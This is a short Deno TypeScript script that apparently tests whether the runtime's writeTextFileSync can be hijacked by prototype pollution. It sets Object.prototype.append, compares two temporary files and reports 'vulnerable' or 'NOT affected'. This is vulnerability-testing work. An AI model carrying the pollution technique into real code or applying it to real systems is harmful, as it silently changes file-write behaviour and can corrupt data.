function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

const data = new TextEncoder().encode("foobar");

const file1 = await Deno.open("./not-polluted", { create: true, write: true });
const file2 = await Deno.open("./yes-polluted", { create: true, write: true });
await file1.write(data);
await file2.write(data);

let unpolluted: string | null = null;
{
    Deno.writeTextFileSync("./not-polluted", data);

    const rfile = await Deno.open("./not-polluted", { read: true, append: false });
    const buffer = new Uint8Array(16);
    await rfile.read(buffer);
    unpolluted = new TextDecoder().decode(buffer);
}

let polluted: string | null = null;
{
    pollute("append", true);

    Deno.writeTextFileSync("./yes-polluted", data);

    const rfile = await Deno.open("./yes-polluted", { read: true, append: false });
    const buffer = new Uint8Array(16);
    await rfile.read(buffer);
    polluted = new TextDecoder().decode(buffer);
}

await Deno.remove("./not-polluted");
await Deno.remove("./yes-polluted");

if (unpolluted !== polluted) {
    console.log("Your Deno version is vulnerable to this gadget.");
} else {
    console.log("Your Deno version is NOT affected.");
}
